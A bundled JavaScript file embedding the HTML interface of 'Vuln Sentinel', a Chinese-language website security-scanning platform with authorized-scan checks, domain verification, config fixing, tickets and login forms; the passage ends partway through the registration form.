(function(){const i=document.createElement("link").relList;if(i&&i.supports&&i.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const o of r)if(o.type==="childList")for(const a of o.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&s(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const o={};return r.integrity&&(o.integrity=r.integrity),r.referrerPolicy&&(o.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?o.credentials="include":r.crossOrigin==="anonymous"?o.credentials="omit":o.credentials="same-origin",o}function s(r){if(r.ep)return;r.ep=!0;const o=t(r);fetch(r.href,o)}})();const Ci=`</head>

<body>

<a href="#page-home" class="skip-link">跳转到主内容</a>



<!-- Skeleton 加载 Screen -->

<div id="skeleton-screen" class="skeleton-screen">

  <div class="skeleton-topbar">

    <div class="skeleton-topbar-logo"></div>

    <div class="skeleton-topbar-line"></div>

  </div>

  <div class="skeleton-search"></div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

</div>





<!-- Toast Container -->

<div class="toast-container" id="toast-container"></div>



<!-- AI Advisor Floating Button -->

<button class="ai-fab" id="ai-fab" onclick="toggleAIChat()" aria-label="打开安全顾问" title="安全顾问">

  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px"><path d="M12 2a8 8 0 0 1 8 8v4a8 8 0 0 1-16 0v-4a8 8 0 0 1 8-8z"/><circle cx="9" cy="10" r="1" fill="currentColor"/><circle cx="15" cy="10" r="1" fill="currentColor"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/></svg>

  <span class="ai-fab-badge" id="ai-fab-badge" style="display:none">0</span>

</button>



<!-- AI Advisor Chat Window -->

<div class="ai-chat" id="ai-chat">

  <div class="ai-chat-header">

    <div class="ai-chat-header-info">

      <div class="ai-avatar" style="background:var(--primary);color:#fff;display:flex;align-items:center;justify-content:center;width:28px;height:28px">VS</div>

      <div>

        <div style="font-size:13px;font-weight:600">安全顾问</div>

        <div style="font-size:11px;color:#808080">在线服务中</div>

      </div>

    </div>

    <button class="ai-chat-close" onclick="toggleAIChat()" aria-label="关闭">×</button>

  </div>

  <div class="ai-chat-body" id="ai-chat-body">

    <div id="ai-offline-notice" style="display:none;padding:8px 10px;background:#313335;border:1px solid #555555;border-radius:2px;font-size:12px;color:var(--text-secondary);text-align:center;margin-bottom:8px">

      当前使用本地规则引擎；配置 LLM 接口密钥 后回答更精准。

    </div>

    <div class="ai-msg bot">

      安全顾问随时在线，可以帮你解读漏洞、生成修复建议、梳理扫描证据，并提示哪些结果待复测。<br><br>

      快捷问题

    </div>

  </div>

  <div class="ai-quick" id="ai-quick">

    <button onclick="askAIQuick('HSTS 是什么？')">HSTS 是什么</button>

    <button onclick="askAIQuick('怎么修 CSP？')">修复 CSP</button>

    <button onclick="askAIQuick('敏感文件怎么防？')">敏感文件</button>

    <button onclick="askAIQuick('SQL 注入怎么防？')">SQL 注入</button>

    <button onclick="askAIQuick('XSS 是什么？')">XSS 漏洞</button>

  </div>

  <div class="ai-chat-input">

    <input type="text" id="ai-input" placeholder="输入安全问题…" maxlength="200" onkeydown="if(event.key==='Enter')sendAIMessage()" />

    <button onclick="sendAIMessage()" aria-label="发送">发送</button>

  </div>

</div>



<div class="page active" id="page-home" role="main">

  <div class="home-hero card fade-in-up">

    <div class="home-hero-top">
      <div class="home-brand-dot"></div>
      <div class="home-brand-title">Vuln Sentinel</div>
    </div>

    <h1 class="home-hero-title">Vuln Sentinel 安全体检平台</h1>
    <div class="home-hero-version">Version 11.0.0 - 20260808</div>

    <div class="home-hero-actions">
      <button onclick="navigateTo('home')" class="home-hero-icon" aria-label="首页">⌂</button>
      <button onclick="navigateTo('scan')" class="home-hero-icon" aria-label="扫描">↗</button>
      <button onclick="navigateTo('profile')" class="home-hero-icon" aria-label="账号">◉</button>
    </div>

    <div class="home-hero-footer">仅用于授权范围内的安全体检、交付复测与持续巡检。</div>
  </div>



  <div id="home-onboarding-banner" class="card fade-in-up" style="display:none;margin-top:14px;padding:14px;border:1px solid rgba(75,110,175,0.35);background:linear-gradient(135deg, rgba(75,110,175,0.12), rgba(115,201,144,0.08))">

    <div style="display:flex;justify-content:space-between;gap:16px;align-items:flex-start;flex-wrap:wrap">

      <div style="min-width:240px;flex:1">

        <div style="font-size:13px;font-weight:700;color:var(--text-primary);margin-bottom:6px">3 步开始你的第一次扫描</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">① 输入授权目标并确认范围 → ② 查看风险、证据、影响与修复建议 → ③ 复测、留档并导出客户可读报告。

        适合客户沟通、交付前验收、持续巡检与复修闭环。</div>

      </div>

      <div style="display:flex;gap:8px;flex-wrap:wrap">

        <button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">开始扫描</button>

        <button onclick="navigateTo('profile')" style="background:rgba(75,110,175,0.12);color:var(--primary);border:1px solid rgba(75,110,175,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">账号设置</button>

        <button onclick="navigateTo('audit')" style="background:rgba(115,201,144,0.12);color:#73c990;border:1px solid rgba(115,201,144,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">上线审计</button>

        <button onclick="dismissHomeOnboarding()" style="background:transparent;color:var(--text-secondary);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px">不再提示</button>

      </div>

    </div>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-top:14px">

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">适合谁</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">安全团队、研发、运维、甲方安全负责人</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">产出什么</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">可直接给客户、管理层和研发看的交付型结果报告</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">闭环能力</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">扫描、证据、修复、验证、工单、复测一条线打通</div>

      </div>

    </div>

  </div>



  <!-- 核心数据总览 -->

  <div class="card fade-in-up dashboard-stats" style="margin-top:14px;padding:12px;background:#3c3f41;border:1px solid #555555">

    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;text-align:center">

      <div class="stat-cell">

        <div class="stat-value" style="color:#73c990" id="home-stat-scan-count">-</div>

        <div class="stat-label">总扫描次数</div>

        <div class="stat-sub">真实运行记录</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#4b6eaf" id="home-stat-high-risk">-</div>

        <div class="stat-label">高风险发现</div>

        <div class="stat-sub">需要优先处理</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#f0a732" id="home-stat-fixed-count">-</div>

        <div class="stat-label">已修复项</div>

        <div class="stat-sub">复测确认关闭</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#c75450" id="home-stat-score">-</div>

        <div class="stat-label">最近评分</div>

        <div class="stat-sub">最近一次扫描</div>

      </div>

    </div>

  </div>



  <!-- 11-S: 技术亮点（最醒目的位置） -->

  <div class="card fade-in-up" style="margin-top:18px;background:#3c3f41;border:1px solid #555555;border-radius:2px;overflow:hidden">

    <!-- 顶部标题栏 -->

    <div style="padding:12px 12px 10px;background:#313335;border-bottom:1px solid #555555">

      <div style="display:flex;align-items:center;gap:10px">

        <div style="flex:1">

          <div style="font-size:13px;font-weight:600;color:#bbbbbb">交付闭环：体检 → 证据定位 → 修复建议 → 复测验证 → 报告留档</div>

          <div style="font-size:11px;color:#808080;margin-top:2px">多平台修复建议 · 证据分层展示 · 导出客户交付报告</div>

        </div>

        <span style="font-size:10px;background:#4b6eaf;color:#fff;padding:2px 8px;border-radius:2px;font-weight:600">11-S 核心能力</span>

      </div>

    </div>

    <!-- 三大技术亮点 -->

    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#555555;margin:0">

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">置信度分级</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">高/中/低三级标注<br>辅助优先级排序</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">反馈闭环</div>

          <div style="font-size:11px;color:#808080;line-height:1.5">用户反馈结果<br>持续优化检测模型</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">安全闭环</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">体检 → 风险定位 → 修复建议 → 复测 → 交付</div>

      </div>

    </div>

    <!-- 本地扫描入口（登录后显示） -->

  </div>



  <!-- 风险趋势图 -->

  <div class="card fade-in-up" style="margin-top:18px">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">

      <strong style="font-size:14px;color:var(--text-primary)">风险趋势</strong>

      <div style="display:flex;gap:6px">

        <button onclick="loadTrendChart(7)" class="trend-range" data-days="7" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">7天</button>

        <button onclick="loadTrendChart(30)" class="trend-range" data-days="30" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">30天</button>

      </div>

    </div>

    <div id="trend-chart" style="min-height:120px;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:12px">扫描几个目标后，即可查看分数变化趋势。</div>

  </div>





  <section id="scan-section" class="scan-section card fade-in-up" style="animation-delay:0.1s">

    <h2 class="card-title">安全扫描</h2>

    <p class="card-desc">输入授权目标并确认范围后开始体检，结果会进入报告、审计和复测闭环。</p>



    <!-- 仪表盘概览（已登录时显示） -->

    <div id="dashboard-overview" style="display:none;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px">

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#4b6eaf" id="stat-total">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">总扫描次数</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#c75450" id="stat-high">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">高风险</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#73c990" id="stat-fixed">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">已修复</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#f0a732" id="stat-score">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">最近评分</div></div>

    </div>



    <!-- 11-S: 安全趋势面板 -->

    <div id="trend-panel" style="display:none;margin-bottom:20px">

      <div class="card" style="padding:16px">

        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

          <div style="display:flex;align-items:center;gap:8px">

            <h3 style="margin:0;font-size:15px;font-weight:700">安全评分趋势</h3>

          </div>

          <div id="trend-summary" style="display:flex;gap:12px;flex-wrap:wrap"></div>

        </div>

        <div id="trend-chart-container" style="position:relative;width:100%;height:200px;background:#313335;border:1px solid #555555;border-radius:2px;overflow:hidden">

          <canvas id="trend-canvas" style="width:100%;height:100%"></canvas>

          <div id="trend-empty" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:13px">暂无扫描数据，完成首次扫描后即可查看趋势</div>

        </div>

        <div id="trend-legend" style="display:flex;gap:12px;margin-top:10px;flex-wrap:wrap"></div>

      </div>

    </div>



    <!-- Step 1: Input URL -->

    <div id="verify-step-1" class="verify-step">

      <div class="verify-step-header">

        <span class="verify-num">1</span>

        <span>输入目标网址</span>

      </div>

      <div class="scan-input-wrap">

        <input id="scan-url" type="url" placeholder="例如：https://示例.com" aria-label="目标网址" oninput="updateScanStartState()" />

      </div>

      <div id="scan-login-tip" style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 14px;margin-bottom:10px;text-align:center;display:none">

        <div style="font-size:12px;color:var(--text-secondary);margin-bottom:6px">登录后即可开始体检，结果会自动进入报告、工单和审计记录</div>

        <button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 18px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">立即登录 / 注册</button>

      </div>

      <div id="scan-credits-hint" style="display:none;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.25);border-radius:2px;padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text-secondary);line-height:1.6">

        <strong style="color:var(--primary)">额度提示</strong><br/>

        当前额度：<span id="scan-credits-value">--</span> · 标准扫描消耗 1 · 深度扫描消耗 3

      </div>

      <label class="scan-checkbox" style="margin-bottom:12px">

        <input id="auth-check-step1" type="checkbox" onchange="updateScanStartState()" />

        <span>我已确认拥有该域名或已获得授权扫描，且不属于政府等受限目标</span>

      </label>

      <button class="scan-btn" id="scan-btn-step1" onclick="startScanDirect()" disabled>开始体检并生成报告</button>

      <div style="text-align:center;margin-top:10px">

        <button onclick="goVerifyStep2()" style="background:none;border:none;color:var(--primary);font-size:13px;padding:8px;cursor:pointer">域名归属验证（推荐）</button>

        <div style="font-size:12px;color:var(--text-secondary);margin-top:4px">快速演示仅适用于自有目标或授权场景，正式交付建议完成归属验证与复测留档</div>

      </div>

      <div style="text-align:center;margin-top:8px">

        <button onclick="showBatchScanModal()" style="background:none;border:1px dashed var(--border);color:var(--text-secondary);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;width:100%">批量体检（一次最多 5 个 URL，适合交付前巡检）</button>

      </div>

    </div>



    <!-- Step 2: Generate Verification 令牌 -->

    <div id="verify-step-2" class="verify-step" style="display:none">

      <div class="verify-step-header">

        <span class="verify-num">2</span>

        <span>域名归属验证</span>

      </div>

      <p class="verify-desc">请选择一种验证方式，在目标网站添加以下验证信息：</p>

      <div class="令牌-box">

        <label>验证 令牌</label>

        <code id="verify-令牌">vuln-sentinel-xxxx</code>

        <button class="令牌-copy-btn" onclick="copyToken()" aria-label="复制验证令牌">复制</button>

      </div>

      <div class="verify-methods">

        <div class="verify-method" onclick="selectVerifyMethod(this, 'dns')">

          <strong>DNS TXT 验证</strong>

          <p>添加 TXT 记录：<code id="dns-record">_vuln-sentinel.example.com TXT "vuln-sentinel-xxxx"</code></p>

        </div>

        <div class="verify-method" onclick="selectVerifyMethod(this, 'file')">

          <strong>网站文件验证</strong>

          <p>在网站根目录创建文件：<code>vuln-sentinel-verification.txt</code>，内容为 令牌</p>

        </div>

      </div>

      <div class="verify-method-selected" id="verify-method-info">

        <p>选择一种验证方式</p>

      </div>

      <button class="scan-btn" onclick="confirmVerification()" id="verify-confirm-btn" disabled>已添加验证信息，确认验证</button>

      <button onclick="skipVerification()" id="verify-skip-btn" style="background:none;border:none;color:var(--primary);font-size:13px;padding:10px;margin-top:6px;cursor:pointer;width:100%;text-align:center">快速测试（跳过 DNS/文件验证）</button>

    </div>



    <!-- Step 3: Ready to Scan -->

    <div id="verify-step-3" class="verify-step" style="display:none">

      <div class="verify-step-header done">

        <span class="verify-num done">OK</span>

        <span>准备开始扫描</span>

      </div>

      <div class="verify-passed">

        <p>已确认目标网址，勾选授权声明后开始扫描。</p>

        <div class="scan-input-wrap">

          <input id="scan-url-confirmed" type="url" readonly aria-label="已确认的目标网址" />

        </div>

        <label class="scan-checkbox">

          <input id="auth-check" type="checkbox" onchange="updateScanStartState()" />

          <span>我已确认拥有该域名或已获得授权扫描，且不属于政府等受限目标</span>

        </label>

        <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap">

          <span style="font-size:13px;color:var(--text-secondary)">扫描深度：</span>

          <div id="scan-depth-group" style="display:inline-flex;border:1px solid var(--border);border-radius:2px;overflow:hidden">

            <label class="scan-depth-opt" data-value="quick" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="quick" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 快速

            </label>

            <label class="scan-depth-opt active" data-value="standard" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--primary);color:#fff;border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="standard" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" checked /> 标准

            </label>

            <label class="scan-depth-opt" data-value="deep" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="deep" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 深度

            </label>

          </div>

          <span id="depth-hint" style="font-size:12px;color:var(--text-secondary);margin-left:4px">约 3-5 秒 · 推荐</span>

        </div>

        <button class="scan-btn" id="scan-btn" onclick="startScan()" disabled>开始体检并生成报告</button>

      </div>

    </div>

  </section>



  <!-- 公开演示扫描 -->

  <div class="card public-report-card" id="public-report-card" style="margin-top:18px">

    <div class="card-title" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">

      <div>

        <span style="font-size:13px">公开演示扫描</span>

        <span style="font-size:12px;color:var(--text-secondary);margin-left:8px">无需登录，即时检测公开站点</span>

      </div>

      <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">

        <select id="public-report-host" onchange="loadPublicDemo()" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:5px 10px;border-radius:2px;font-size:12px;cursor:pointer">

          <option value="https://example.com">example.com</option>

          <option value="https://www.iana.org">iana.org</option>

          <option value="https://httpbin.org">httpbin.org</option>

          <option value="https://testphp.vulnweb.com">testphp.vulnweb.com（公开演示）</option>

        </select>

        <button onclick="loadPublicDemo()" id="public-report-refresh" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:5px 12px;border-radius:2px;font-size:12px;cursor:pointer;font-weight:500">刷新报告</button>

      </div>

    </div>

    <div id="public-report-content">

      <div style="padding:16px;text-align:center;color:var(--text-secondary);background:var(--bg);border-radius:2px;margin-top:12px;border:1px dashed var(--border)">

        <div style="font-size:12px;margin-bottom:8px;color:var(--text)">选择公开演示站点，立即查看扫描结果</div>

        <div style="margin-top:10px"><button onclick="loadPublicDemo()" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">查看公开测试结果</button></div>

      </div>

    </div>

  </div>

</div>



<div class="page" id="page-result">

  <div class="workbench-header">

    <h1 class="workbench-title">扫描结果</h1>

    <span class="workbench-subtitle">查看漏洞发现、响应头与修复建议</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>

  <div id="result-content"></div>

</div>



<div class="page" id="page-fixer">

  <div class="workbench-header">

    <h1 class="workbench-title">修复器</h1>

    <span class="workbench-subtitle">检查配置文件并生成安全加固补丁</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">输入配置</div>

    <p class="card-desc" style="margin-bottom:12px">粘贴 Nginx/Apache 配置文件，检测安全问题并生成修复补丁。</p>

    <textarea id="fixer-input" class="fixer-textarea" placeholder="粘贴服务器配置文件...&#10;&#10;例如：&#10;server {&#10;    listen 80;&#10;    server_name example.com;&#10;    ...&#10;}"></textarea>

    <div class="fixer-btns">

      <button class="fixer-btn primary" id="fixer-analyze-btn" onclick="analyzeFixer()">检查配置</button>

      <button class="fixer-btn secondary" onclick="loadSampleConfig()">载入参考配置</button>

      <button class="fixer-btn secondary" onclick="clearFixer()">清空</button>

    </div>

  </div>



  <div class="card" id="fixer-scan-prompt">

    <div class="card-title">使用上次扫描结果</div>

    <p style="font-size:13px;color:var(--text-secondary);line-height:1.8">

      1. 在<strong>扫描</strong>页面完成网站安全扫描<br>

      2. 扫描结果页点击<strong>"生成修复配置"</strong><br>

      3. 此处自动生成 Nginx、Python、Node.js、Apache 修复代码

    </p>

    <div class="fixer-btns" style="margin-top:12px">

      <button class="fixer-btn primary" id="goto-fixer-btn" onclick="goToFixerWithScanResult()" aria-label="生成修复配置">使用上次扫描结果生成</button>

    </div>

  </div>



  <div id="fixer-lang-tabs" style="display:none;margin:16px 0">

    <div style="display:flex;gap:6px;flex-wrap:wrap">

      <button class="fixer-btn primary lang-tab active" data-lang="nginx" onclick="switchFixLang('nginx')">Nginx</button>

      <button class="fixer-btn secondary lang-tab" data-lang="python" onclick="switchFixLang('python')">Python</button>

      <button class="fixer-btn secondary lang-tab" data-lang="nodejs" onclick="switchFixLang('nodejs')">Node.js</button>

      <button class="fixer-btn secondary lang-tab" data-lang="apache" onclick="switchFixLang('apache')">Apache</button>

    </div>

  </div>



  <div id="fixer-result"></div>

</div>



<!-- 进化页面 11-S -->

<div class="page" id="page-evolution">

  <div class="workbench-header">

    <h1 class="workbench-title">进化中心</h1>

    <span class="workbench-subtitle">历史学习与持续监控</span>

  </div>

  <div id="evolution-content" style="min-height:400px"></div>

</div>



<!-- 资产管理页面 -->

<div class="page" id="page-assets">

  <div class="workbench-header">

    <h1 class="workbench-title">资产管理</h1>

    <span class="workbench-subtitle">管理网站域名资产与扫描状态</span>

  </div>



  <!-- 添加资产表单 -->

  <div class="card" style="margin-bottom:16px">

    <div class="card-title">添加资产</div>

    <div class="settings-row-static" style="padding:14px 0 0 0;border-bottom:none;flex-wrap:wrap">

      <div style="flex:1;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">域名</label>

        <input type="text" id="asset-domain" placeholder="示例.com" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:1;min-width:160px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">负责人</label>

        <input type="text" id="asset-owner" placeholder="负责人姓名" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:2;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">描述</label>

        <input type="text" id="asset-description" placeholder="资产描述（可选）" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <button class="fixer-btn primary" data-action="add-asset" style="height:32px;padding:0 16px">添加</button>

    </div>

    <div id="asset-form-error" style="color:var(--danger);font-size:12px;margin-top:8px;display:none"></div>

  </div>



  <!-- 资产列表 -->

  <div class="card" id="asset-list-container">

    <div class="card-title">资产列表</div>

    <div id="asset-list" style="margin-top:10px"></div>

    <div id="asset-empty" class="ticket-empty" style="display:none">

      <div class="ticket-empty-icon"></div>

      <p>暂无资产</p>

      <p class="ticket-empty-hint">添加域名资产后可跟踪扫描状态</p>

    </div>

  </div>

</div>



<!-- 修复工单页面 -->

<div class="page" id="page-tickets">

  <div class="workbench-header">

    <h1 class="workbench-title">修复工单</h1>

    <span class="workbench-subtitle">跟踪和管理扫描发现的安全问题</span>

  </div>



  <!-- 状态标签页 -->

  <div class="ticket-tabs">

    <button class="ticket-tab active" data-action="switch-ticket-tab" data-status="pending">待修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="in_progress">修复中</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="fixed">已修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="ignored">已忽略</button>

  </div>



  <!-- 批量操作 -->

  <div class="ticket-batch" id="ticket-batch-bar" style="display:none">

    <label class="ticket-batch-label"><input type="checkbox" id="ticket-select-all" data-action="toggle-select-all"> 全选</label>

    <span id="ticket-selected-count" class="ticket-selected-count">已选 0 项</span>

    <div class="ticket-batch-actions">

      <button class="ticket-batch-btn" data-action="batch-update" data-status="in_progress">标记修复中</button>

      <button class="ticket-batch-btn" data-action="batch-update" data-status="fixed">标记已修复</button>

      <button class="ticket-batch-btn secondary" data-action="batch-update" data-status="ignored">标记已忽略</button>

      <button class="ticket-batch-btn danger" data-action="batch-delete">删除</button>

    </div>

  </div>



  <!-- 工单工作台：左侧列表 / 右侧详情 -->

  <div class="ticket-workbench" id="ticket-workbench" style="display:none">

    <div class="ticket-list-panel">

      <div class="ticket-list-header">工单列表</div>

      <div class="ticket-table-wrap">

        <table class="ticket-table" id="ticket-table">

          <thead><tr><th style="width:30px"><input type="checkbox" id="ticket-select-all-table" data-action="toggle-select-all"></th><th>发现项</th><th>等级</th><th>状态</th><th>创建时间</th></tr></thead>

          <tbody id="ticket-list"></tbody>

        </table>

      </div>

    </div>

    <div class="ticket-detail-panel" id="ticket-detail-panel">

      <div class="ticket-detail-empty">选择左侧工单查看详情</div>

    </div>

  </div>



  <!-- 空状态 -->

  <div id="ticket-empty" class="ticket-empty" style="display:none">

    <div class="ticket-empty-icon"></div>

    <p>该状态下暂无工单</p>

    <p class="ticket-empty-hint">完成扫描后，高危/严重问题会自动创建工单，也可以从结果页手动转工单。</p>

    <div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:12px">

      <button class="fixer-btn primary" onclick="navigateTo('home')">去看报告</button>

      <button class="fixer-btn secondary" onclick="navigateTo('scan')">开始体检</button>

    </div>

  </div>

</div>



<div class="page" id="page-profile">

  <div class="workbench-header">

    <h1 class="workbench-title">设置</h1>

    <span class="workbench-subtitle">账号、主题与系统配置</span>

  </div>



  <!-- 登录/注册区域 -->

  <div id="auth-section">

    <!-- 未登录：显示登录/注册表单 -->

    <div id="auth-guest" style="display:none">

      <div class="card auth-form">

        <h3>账号登录</h3>

        <div class="auth-form-error" id="login-error"></div><div id="auth-status-message" class="auth-form-hint" style="margin-top:8px;color:var(--text-secondary)">可用受控测试账号登录，或直接使用你的账号。</div>

        <div class="auth-form-row">

          <input type="text" id="login-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <label for="login-password" class="sr-only">密码</label><input type="password" id="login-password" aria-label="密码" placeholder="密码" />

        </div>

        <div class="auth-form-row">

          <div id="auth-challenge-question" class="auth-form-hint" style="margin-bottom:8px">验证码加载中...</div>
          <input type="hidden" id="auth-challenge-token" />
          <input type="text" id="login-challenge-answer" placeholder="验证码答案" aria-label="验证码答案" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doLogin()">登 录</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('reset')">找回密码</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('reset')">找回密码</a> · <a onclick="toggleAuthForm('register')">立即注册</a>

        </div>

      </div>

    </div>



    <!-- 重置密码表单 -->

    <div id="auth-reset" style="display:none">

      <div class="card auth-form">

        <h3>修改密码</h3>

        <div class="auth-form-error" id="reset-error"></div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password" placeholder="新密码（至少6位）" aria-label="新密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password2" placeholder="确认新密码" aria-label="确认新密码" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reset-password-token" placeholder="重置令牌" aria-label="重置令牌" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doResetPassword()">确认重置</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('login')">返回登录</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('login')">返回登录</a>

        </div>

      </div>

    </div>



    <!-- 注册表单 -->

    <div id="auth-register" style="display:none">

      <div class="card auth-form">

        <h3>注册新账号</h3>

        <div class="auth-form-error" id="register-error"></div>

